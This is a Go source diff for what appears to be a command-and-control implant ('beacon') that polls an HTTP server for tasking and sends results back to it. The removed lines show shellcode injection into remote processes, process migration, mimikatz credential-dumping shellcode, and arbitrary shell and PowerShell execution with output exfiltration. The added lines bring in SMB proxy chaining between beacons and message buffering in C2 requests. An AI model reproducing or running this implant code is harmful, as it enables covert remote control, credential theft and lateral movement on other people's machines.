@@ -4,18 +4,12 @@ import (
 	"os"
 	"io"
 	"fmt"
-	"bufio"
 	"bytes"
-	"strconv"
-	"os/exec"
 	"strings"
-	"runtime"
 	"net/http"
-	"encoding/hex"
 	"encoding/json"
     "mime/multipart"
 	b64 "encoding/base64"
-	ps "github.com/mitchellh/go-ps"
 )
 
 func (packet BeaconHttp) exitHandler() {
@@ -25,6 +19,16 @@ func (packet BeaconHttp) exitHandler() {
 	queryCommandHttp(encoded)
 	os.Exit(1)
 }
+
+/*
+	Packet structure:
+	{
+		self packet data,
+		client0 packet data,
+		client1 packet data,
+		...
+	}
+*/
 
 func (packet BeaconHttp) queryServer() {
 	resp, err := queryCommandHttp(string(packet.data))
@@ -40,199 +44,47 @@ func (packet BeaconHttp) queryServer() {
 		controlDataBytes, err := io.ReadAll(resp.Body)
 		debugFatal(err)
 		encData, _ := b64.StdEncoding.DecodeString(string(controlDataBytes))
-		data := securityContext.decrypt(encData)
-
-		var beaconMsg BeaconMessage
-		var commResp CommandResponse
-		json.Unmarshal([]byte(data), &beaconMsg)
-		fmt.Println(beaconMsg.Data)
-		beaconData, err := b64.StdEncoding.DecodeString(beaconMsg.Data)
-		beaconRoute, err := b64.StdEncoding.DecodeString(beaconMsg.Route)
-		
-		if err != nil {
-			debugFatal(err)
-			return
-		}
-		
-		json.Unmarshal(beaconData, &commResp)
-
-		if len(beaconRoute) > 0 {
-			if beaconRoute[0] == 0 {
-				json.Unmarshal([]byte(beaconData), &commResp)
-				packet.handleQueryResponse(commResp)
-			}
-		}
+		handleQueryResponse(encData)
 	} else if debug {
 		fmt.Println("Couldn't reach command.")
 	}
 }
 
 func (packet BeaconHttp) addProxyClient(client Beacon) {
-	packet.proxyClients = append(packet.proxyClients, client)
+	for _, pclient := range packet.proxyClients {
+		if client.Id == pclient.Id {
+			return
+		}
+	}
+
+	var data []byte
+	beaconSmbClient := BeaconSmbClient { beacon: client }
+	err := beaconSmbClient.tryHandshake()
+	
+	if err == nil {
+		packet.proxyClients = append(packet.proxyClients, client)
+		beaconSmbClients = append(beaconSmbClients, beaconSmbClient)
+		data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"proxyConnectSuccess",[]byte(client.Id)})
+	} else{
+		data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"proxyConnectFail",[]byte(client.Id)})	
+	}
+
+	debugFatal(err)
+	encoded := b64.StdEncoding.EncodeToString(data)
+	queryCommandHttp(encoded)
 }
 
 func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
+	for _, msg := range msgBuffer {
+		encoded := b64.StdEncoding.EncodeToString([]byte(msg))
+		endpoint += "," + encoded
+	}
+
 	url := "http://" + cmdAddress + ":" + cmdPort + "/" + endpoint
 	req, err := http.NewRequest("GET", url, nil)
 	debugFatal(err)
 	req.Host = cmdHost
 	return netClient.Do(req)
-}
-
-func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
-	for i := 0; i < len(commResp.Shellcode); i += 2 {
-		var output string
-		procId := -1
-		shellcode := commResp.Shellcode[i]
-		procInfo := strings.Split(commResp.Shellcode[i+1], " ")
-		
-		if procInfo[0] != "module" {
-			procId, _ = strconv.Atoi(procInfo[1])
-		}
-		
-		decodedShellcode, err := b64.StdEncoding.DecodeString(shellcode)
-
-		if err != nil {
-			debugFatal(err)
-			continue
-		}
-
-		if procInfo[0] != "module" {
-			si := RemoteShellcodeInjector { decodedShellcode, procId }
-			err := si.inject()
-			if err != nil {
-				output = err.Error()
-			} else {
-				output = ""
-			}
-		} else {
-			si := RemotePipedShellcodeInjector { decodedShellcode, strings.Join(procInfo[1:], " ") }
-			output = si.inject()
-		}
-		
-		var data []byte
-				
-		if procInfo[0] == "migrate" {
-			var msg string
-			if err == nil || err.Error() == "The operation completed successfully." {
-				msg = "Success"
-				defer packet.exitHandler()
-			} else {
-				msg = err.Error()
-			}
-
-			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"migrate",[]byte(msg)})
-		} else if procInfo[0] == "module" {
-			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(output)})
-		} else {
-			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(output)})
-		}
-
-		debugFatal(err)
-	 	encoded := b64.StdEncoding.EncodeToString(data)
-		queryCommandHttp(encoded)
-	
-	}
-
-	for _, file := range commResp.Download {
-		packet.upload(file)
-	}
-
-	for _, file := range commResp.Upload {
-		packet.download(file)
-	}
-
-	for _, client := range commResp.ProxyClients {
-		var beacon Beacon
-		json.Unmarshal([]byte(client), &beacon)
-		fmt.Println("Adding proxy " + beacon.Id)
-		packet.addProxyClient(beacon)
-	}
-
-	for _, cmd := range commResp.Exec {
-		cmdSplit := strings.Fields(cmd);
-		output := []byte{}
-		
-		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
-			packet.exitHandler()
-		}
-
-		if cmdSplit[0] == "mimikatz" {
-			data, _ := hex.DecodeString(mimikatzShellcode)
-			injector := RemotePipedShellcodeInjector { 
-				shellcode: data,
-				args: strings.Join(append(cmdSplit[0:], "exit"), " "),
-			}
-
-			out := injector.inject()
-			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"mimikatz",[]byte(out)})
-			debugFatal(err)
-			encoded := b64.StdEncoding.EncodeToString(data)
-			queryCommandHttp(encoded)
-			return
-		}
-
-		if cmdSplit[0] == "plist" {
-			procs := "------------------------------\nPID\tPPID\tName\n------------------------------"
-			procList, _ := ps.Processes()
-			
-			for _, p := range procList {
-				procs += "\n" + strconv.Itoa(p.Pid()) + "\t" + strconv.Itoa(p.PPid()) + "\t" + p.Executable()
-			}
-
-			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"plist",[]byte(procs)})
-			debugFatal(err)
-			encoded := b64.StdEncoding.EncodeToString(data)
-			queryCommandHttp(encoded)
-			return
-		}
-		
-		var cmdHandle *exec.Cmd
-
-		if runtime.GOOS == "linux" {
-			command := []string{ "-c", cmd }
-			cmdHandle = exec.Command("/bin/sh", command...)
-		} else if runtime.GOOS == "windows" {
-			command := []string { "-c", cmd }
-			cmdHandle = exec.Command("powershell", command...)
-		}
-
-		stderr, err := cmdHandle.StderrPipe()
-		stdout, err := cmdHandle.StdoutPipe()
-		
-		if err = cmdHandle.Start(); err == nil {
-			scanner := bufio.NewScanner(stderr)
-			
-			if err != nil {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
-
-			for scanner.Scan() {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
-
-			scanner = bufio.NewScanner(stdout)
-			
-			if err != nil {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
-
-			for scanner.Scan() {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
-		}
-		
-		if len(output) > 0 {
-			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"exec",output})
-			debugFatal(err)
-			encoded := b64.StdEncoding.EncodeToString(data)
-			queryCommandHttp(encoded)
-		}
-	}
 }
 
 func (packet BeaconHttp) download(filePath string) {
@@ -249,7 +101,6 @@ func (packet BeaconHttp) download(filePath string) {
 	debugFatal(err)
 	req.Host = "command.com"
 	resp, err := netClient.Do(req)
-	fmt.Println(url)
 	debugFatal(err)
 	defer resp.Body.Close()
 	targetDir := ""
